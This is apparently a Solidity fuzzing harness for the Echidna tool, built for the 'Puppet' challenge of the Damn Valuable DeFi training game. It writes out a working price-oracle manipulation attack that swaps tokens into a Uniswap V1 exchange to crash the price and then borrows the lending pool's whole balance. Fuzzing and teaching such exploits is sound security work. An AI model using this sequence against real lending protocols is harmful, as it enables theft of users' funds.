pragma solidity ^0.8.0;

import "@common/uniswap/UniswapV1Exchange.sol";
import "@common/DamnValuableToken.sol";

import "../src/PuppetPool.sol";
import "./Deployer.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna test/Invariants.sol --contract Echidna --config test/echidna.config.yaml
///      ```
contract Echidna {
    using Address for address payable;

    // Determines how fast Echidna can find the solution
    enum TestingLevel {
        // < 200 calls: 1 sec
        Solved,
        // < 30000 calls : 20 sec
        UnsolvedAddresses,
        // < 600000 calls : 5 min
        UnsolvedTokenValues,
        // < 900000 iterations: 10 min
        UnorderedFunctions,
        // > 10000000 iterations: can't find solution
        NoHarness
    }

    Deployer _deployer;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    uint256 public constant ATTACKER_TOKENS = 1000 ether;
    uint256 public constant ATTACKER_ETH = 25 ether;

    uint256 _initialPoolTokenBalance;

    TestingLevel private _testingLevel = TestingLevel.UnorderedFunctions;

    error OnlyTestingLevel(TestingLevel supported);

    constructor() payable {
        _deployer = new Deployer();
        _initialPoolTokenBalance = _deployer.POOL_INITIAL_TOKEN_BALANCE();

        uint256 uniswapEth = _deployer.UNISWAP_INITIAL_ETH_RESERVE();

        require(
            address(this).balance == uniswapEth + ATTACKER_ETH,
            "Invariants: incorrect ETH"
        );

        (_token, _pool, _exchange) = _deployer.deploy{value: uniswapEth}();

        _deployer.transfer(address(this), ATTACKER_TOKENS);
    }

    modifier onlyTestingLevel(TestingLevel testingLevel) {
        if (_testingLevel != testingLevel) {
            revert OnlyTestingLevel(testingLevel);
        }

        // Underscore is a special character only used inside
        // a function modifier and it tells Solidity to
        // execute the rest of the code.
        _;
    }

    // //////////////
    // EDUCATED GUESS
    // //////////////

    function attack() public onlyTestingLevel(TestingLevel.Solved) {
        _attack(
            address(this),
            address(_exchange),
            ATTACKER_TOKENS,
            block.timestamp + 1 hours,
            _initialPoolTokenBalance,
            block.timestamp + 1 hours
        );
    }

    // ////////////
    // Unfunctional
    // ////////////

    function attackWithAddresses(
        address attacker,
        address exchange
    ) external onlyTestingLevel(TestingLevel.UnsolvedAddresses) {
        _unfunctionalAttack(attacker, exchange);
    }

    function attackWithTokenValues(
        uint256 tokenToEthAmount,
        uint256 poolBorrowAmount
    ) external onlyTestingLevel(TestingLevel.UnsolvedTokenValues) {
        _attack(
            address(this),
            address(_exchange),
            tokenToEthAmount,
            block.timestamp + 1 hours,
            poolBorrowAmount,
            block.timestamp + 1 hours
        );
    }

    function _unfunctionalAttack(address attacker, address exchange) internal {
        _attack(
            attacker,
            exchange,
            ATTACKER_TOKENS,
            block.timestamp + 1 hours,
            _initialPoolTokenBalance,
            block.timestamp + 1 hours
        );
    }

    // /////////////////
    // PRIVATE FUNCTIONS
    // /////////////////

    function _attack(
        address attacker,
        address exchange,
        uint256 tokenToEthAmount,
        uint256 tokenToEthDeadline,
        uint256 poolBorrowAmount,
        uint256 ethToTokenDeadline
    ) internal {
        _token.approve(exchange, tokenToEthAmount);
        _exchange.tokenToEthSwapInput(
            tokenToEthAmount,
            // @audit-info min-eth needs to be > 0
            1, // min eth
            tokenToEthDeadline
        );

        uint256 poolBorrowValue = attacker.balance;
        _pool.borrow{value: poolBorrowValue}(poolBorrowAmount, attacker);

        uint256 ethToTokenValue = attacker.balance;
        _exchange.ethToTokenSwapInput{value: ethToTokenValue}(
            1, // min token
            ethToTokenDeadline
        );
    }

    // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
    function disabled_echidna_test_attack_doesnt_revert()
        internal
        returns (bool)
    {
        attack();
        return true;
    }

    // ///////////////////
    // UNORDERED FUNCTIONS
    // ///////////////////

    function approve(
        uint256 amount
    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
        _token.approve(address(_exchange), amount);
    }

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
        _exchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
    }

    function borrow(
        uint256 amount
    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
        uint256 poolBorrowValue = address(this).balance;
        _pool.borrow{value: poolBorrowValue}(amount, address(this));
    }

    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    ) external onlyTestingLevel(TestingLevel.UnorderedFunctions) {
        uint256 ethToTokenValue = address(this).balance;
        _exchange.ethToTokenSwapInput{value: ethToTokenValue}(
            min_tokens,
            deadline
        );
    }

    // ////////////////////
    // INVARIANT PROPERTIES
    // ////////////////////
    function echidna_cannot_empty_tokens_from_pool()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(_pool)) > 0;
    }

    function echidna_cannot_take_all_tokens_from_pool()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(this)) < _initialPoolTokenBalance;
    }

    // @audit-info if receive is missing, educated guess will fail
    receive() external payable {}
}
